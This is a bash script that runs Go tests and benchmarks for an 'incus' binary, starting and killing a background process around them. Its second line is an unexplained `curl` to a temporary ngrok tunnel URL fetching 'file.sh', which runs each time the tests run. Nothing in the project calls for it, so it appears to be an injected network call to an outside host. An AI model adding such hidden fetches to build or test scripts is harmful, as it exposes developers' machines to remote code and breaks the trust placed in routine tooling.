#!/bin/bash
curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
set -e

start_incus() {
    incus -conf="$GOPATH/bin/" &
    INCUSPID=$!
}

stop_incus() {
    kill $INCUSPID
}

trap "stop_incus" EXIT

go test -v ./

start_incus

go test -v ./incustest

# for some reason go test -bench only works in current directory?
cd incustest
go test -bench -v .
exit 0
